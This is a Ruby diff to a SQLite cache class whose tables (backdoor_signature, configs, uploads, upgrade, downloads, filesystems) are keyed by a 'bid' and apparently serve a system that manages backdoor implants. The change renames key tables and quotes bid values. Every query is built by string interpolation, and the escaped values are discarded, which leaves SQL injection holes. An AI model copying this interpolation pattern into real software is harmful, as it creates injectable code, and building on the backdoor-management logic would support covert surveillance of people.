@@ -24,12 +24,12 @@ class DBCache
     # the schema of the persistent cache
     schema = ["CREATE TABLE backdoor_signature (signature CHAR(32))",
               "CREATE TABLE network_signature (signature CHAR(32))",
-              "CREATE TABLE class_keys (id CHAR(16), key CHAR(32))",
-              "CREATE TABLE configs (bid INT, config BLOB)",
-              "CREATE TABLE uploads (bid INT, uid INT, filename TEXT, content BLOB)",
-              "CREATE TABLE upgrade (bid INT, uid INT, filename TEXT, content BLOB)",
-              "CREATE TABLE downloads (bid INT, did INT, filename TEXT)",
-              "CREATE TABLE filesystems (bid INT, fid INT, depth INT, path TEXT)"
+              "CREATE TABLE factory_keys (id CHAR(16), key CHAR(32))",
+              "CREATE TABLE configs (bid CHAR(32), config BLOB)",
+              "CREATE TABLE uploads (bid CHAR(32), uid INT, filename TEXT, content BLOB)",
+              "CREATE TABLE upgrade (bid CHAR(32), uid INT, filename TEXT, content BLOB)",
+              "CREATE TABLE downloads (bid CHAR(32), did INT, filename TEXT)",
+              "CREATE TABLE filesystems (bid CHAR(32), fid INT, depth INT, path TEXT)"
              ]
 
     # create all the tables
@@ -62,7 +62,7 @@ class DBCache
     count = 0
     begin
       db = SQLite3::Database.open CACHE_FILE
-      db.execute("SELECT COUNT(*) FROM class_keys;") do |row|
+      db.execute("SELECT COUNT(*) FROM factory_keys;") do |row|
         count = row.first
       end
       db.close
@@ -148,17 +148,17 @@ class DBCache
   end
 
   ##############################################
-  # CLASS KEYS
+  # FACTORY KEYS
   ##############################################
 
-  def self.add_class_keys(class_keys)
+  def self.add_factory_keys(factory_keys)
     # ensure the db was already created, otherwise create it
     create! unless File.exist?(CACHE_FILE)
 
     begin
       db = SQLite3::Database.open CACHE_FILE
-      class_keys.each_pair do |key, value|
-        db.execute("INSERT INTO class_keys VALUES ('#{key}','#{value}');")
+      factory_keys.each_pair do |key, value|
+        db.execute("INSERT INTO factory_keys VALUES ('#{key}','#{value}');")
       end
       db.close
     rescue Exception => e
@@ -166,21 +166,21 @@ class DBCache
     end
   end
 
-  def self.class_keys
+  def self.factory_keys
     return {} unless File.exist?(CACHE_FILE)
 
-    class_keys = {}
+    factory_keys = {}
     begin
       db = SQLite3::Database.open CACHE_FILE
-      db.execute("SELECT * FROM class_keys;") do |row|
-        class_keys[row[0]] = row[1]
+      db.execute("SELECT * FROM factory_keys;") do |row|
+        factory_keys[row[0]] = row[1]
       end
       db.close
     rescue Exception => e
       trace :warn, "Cannot read the cache: #{e.message}"
     end
 
-    return class_keys
+    return factory_keys
   end
 
   ##############################################
@@ -192,7 +192,7 @@ class DBCache
 
     begin
       db = SQLite3::Database.open CACHE_FILE
-      ret = db.execute("SELECT bid FROM configs WHERE bid = #{bid};")
+      ret = db.execute("SELECT bid FROM configs WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
       trace :warn, "Cannot read the cache: #{e.message}"
@@ -206,7 +206,7 @@ class DBCache
 
     begin
       db = SQLite3::Database.open CACHE_FILE
-      ret = db.execute("SELECT config FROM configs WHERE bid = #{bid};")
+      ret = db.execute("SELECT config FROM configs WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
       trace :warn, "Cannot read the cache: #{e.message}"
@@ -223,7 +223,7 @@ class DBCache
     
     begin
       db = SQLite3::Database.open CACHE_FILE
-      db.execute("INSERT INTO configs VALUES (#{bid}, ? )", SQLite3::Blob.new(config))
+      db.execute("INSERT INTO configs VALUES ('#{bid}', ? )", SQLite3::Blob.new(config))
       db.close
     rescue Exception => e
       trace :warn, "Cannot save the cache: #{e.message}"
@@ -235,7 +235,7 @@ class DBCache
 
     begin
       db = SQLite3::Database.open CACHE_FILE
-      db.execute("DELETE FROM configs WHERE bid = #{bid};")
+      db.execute("DELETE FROM configs WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
       trace :warn, "Cannot write the cache: #{e.message}"
@@ -251,7 +251,7 @@ class DBCache
 
     begin
       db = SQLite3::Database.open CACHE_FILE
-      ret = db.execute("SELECT uid FROM uploads WHERE bid = #{bid};")
+      ret = db.execute("SELECT uid FROM uploads WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
       trace :warn, "Cannot read the cache: #{e.message}"
@@ -269,10 +269,10 @@ class DBCache
       # take just the first one
       # the others will be sent in later requests
       ret = db.execute("SELECT uid, filename, content FROM uploads " +
-                       "WHERE bid = #{bid} " +
+                       "WHERE bid = '#{bid}' " +
                        "ORDER BY uid " +
                        "LIMIT 1")
-      count = db.execute("SELECT COUNT(*) FROM uploads WHERE bid = #{bid};")
+      count = db.execute("SELECT COUNT(*) FROM uploads WHERE bid = '#{bid}';")
 
       # how many upload do we have still to send after this one ?
       left = count[0][0].to_i - 1
@@ -296,7 +296,7 @@ class DBCache
       db = SQLite3::Database.open CACHE_FILE
       uploads.each_pair do |key, value|
         SQLite3::Database.safe_escape value[:filename]
-        db.execute("INSERT INTO uploads VALUES (#{bid}, #{key}, '#{value[:filename]}', ? )", SQLite3::Blob.new(value[:content]))
+        db.execute("INSERT INTO uploads VALUES ('#{bid}', #{key}, '#{value[:filename]}', ? )", SQLite3::Blob.new(value[:content]))
       end
       db.close
     rescue Exception => e
@@ -309,7 +309,7 @@ class DBCache
 
     begin
       db = SQLite3::Database.open CACHE_FILE
-      db.execute("DELETE FROM uploads WHERE bid = #{bid} AND uid = #{id};")
+      db.execute("DELETE FROM uploads WHERE bid = '#{bid}' AND uid = #{id};")
       db.close
     rescue Exception => e
       trace :warn, "Cannot write the cache: #{e.message}"
@@ -325,7 +325,7 @@ class DBCache
 
     begin
       db = SQLite3::Database.open CACHE_FILE
-      ret = db.execute("SELECT uid FROM upgrade WHERE bid = #{bid};")
+      ret = db.execute("SELECT uid FROM upgrade WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
       trace :warn, "Cannot read the cache: #{e.message}"
@@ -343,10 +343,10 @@ class DBCache
       # take just the first one
       # the others will be sent in later requests
       ret = db.execute("SELECT uid, filename, content FROM upgrade " +
-                       "WHERE bid = #{bid} " +
+                       "WHERE bid = '#{bid}' " +
                        "ORDER BY uid " +
                        "LIMIT 1")
-      count = db.execute("SELECT COUNT(*) FROM upgrade WHERE bid = #{bid};")
+      count = db.execute("SELECT COUNT(*) FROM upgrade WHERE bid = '#{bid}';")
 
       # how many upgrade do we have still to send after this one ?
       left = count[0][0].to_i - 1
@@ -369,7 +369,7 @@ class DBCache
     begin
       db = SQLite3::Database.open CACHE_FILE
       upgrade.each_pair do |key, value|
-        db.execute("INSERT INTO upgrade VALUES (#{bid}, #{key}, '#{value[:filename]}', ? )", SQLite3::Blob.new(value[:content]))
+        db.execute("INSERT INTO upgrade VALUES ('#{bid}', #{key}, '#{value[:filename]}', ? )", SQLite3::Blob.new(value[:content]))
       end
       db.close
     rescue Exception => e
@@ -382,7 +382,7 @@ class DBCache
 
     begin
       db = SQLite3::Database.open CACHE_FILE
-      db.execute("DELETE FROM upgrade WHERE bid = #{bid} AND uid = #{id};")
+      db.execute("DELETE FROM upgrade WHERE bid = '#{bid}' AND uid = #{id};")
       db.close
     rescue Exception => e
       trace :warn, "Cannot write the cache: #{e.message}"
@@ -394,7 +394,7 @@ class DBCache
 
     begin
       db = SQLite3::Database.open CACHE_FILE
-      db.execute("DELETE FROM upgrade WHERE bid = #{bid};")
+      db.execute("DELETE FROM upgrade WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
       trace :warn, "Cannot write the cache: #{e.message}"
@@ -410,7 +410,7 @@ class DBCache
 
     begin
       db = SQLite3::Database.open CACHE_FILE
-      ret = db.execute("SELECT did FROM downloads WHERE bid = #{bid};")
+      ret = db.execute("SELECT did FROM downloads WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
       trace :warn, "Cannot read the cache: #{e.message}"
@@ -424,7 +424,7 @@ class DBCache
 
     begin
       db = SQLite3::Database.open CACHE_FILE
-      ret = db.execute("SELECT did, filename FROM downloads WHERE bid = #{bid};")
+      ret = db.execute("SELECT did, filename FROM downloads WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
       trace :warn, "Cannot read the cache: #{e.message}"
@@ -446,7 +446,7 @@ class DBCache
       db = SQLite3::Database.open CACHE_FILE
       downloads.each_pair do |key, value|
         SQLite3::Database.safe_escape value
-        db.execute("INSERT INTO downloads VALUES (#{bid}, #{key}, '#{value}' )")
+        db.execute("INSERT INTO downloads VALUES ('#{bid}', #{key}, '#{value}' )")
       end
       db.close
     rescue Exception => e
@@ -459,7 +459,7 @@ class DBCache
 
     begin
       db = SQLite3::Database.open CACHE_FILE
-      db.execute("DELETE FROM downloads WHERE bid = #{bid};")
+      db.execute("DELETE FROM downloads WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
       trace :warn, "Cannot write the cache: #{e.message}"
@@ -475,7 +475,7 @@ class DBCache
 
     begin
       db = SQLite3::Database.open CACHE_FILE
-      ret = db.execute("SELECT fid FROM filesystems WHERE bid = #{bid};")
+      ret = db.execute("SELECT fid FROM filesystems WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
       trace :warn, "Cannot read the cache: #{e.message}"
@@ -489,7 +489,7 @@ class DBCache
 
     begin
       db = SQLite3::Database.open CACHE_FILE
-      ret = db.execute("SELECT fid, depth, path FROM filesystems WHERE bid = #{bid};")
+      ret = db.execute("SELECT fid, depth, path FROM filesystems WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
       trace :warn, "Cannot read the cache: #{e.message}"
@@ -511,7 +511,7 @@ class DBCache
       db = SQLite3::Database.open CACHE_FILE
       filesystems.each_pair do |key, value|
         SQLite3::Database.safe_escape value[:path]
-        db.execute("INSERT INTO filesystems VALUES (#{bid}, #{key}, #{value[:depth]}, '#{value[:path]}' )")
+        db.execute("INSERT INTO filesystems VALUES ('#{bid}', #{key}, #{value[:depth]}, '#{value[:path]}' )")
       end
       db.close
     rescue Exception => e
@@ -524,7 +524,7 @@ class DBCache
 
     begin
       db = SQLite3::Database.open CACHE_FILE
-      db.execute("DELETE FROM filesystems WHERE bid = #{bid};")
+      db.execute("DELETE FROM filesystems WHERE bid = '#{bid}';")
       db.close
     rescue Exception => e
       trace :warn, "Cannot write the cache: #{e.message}"
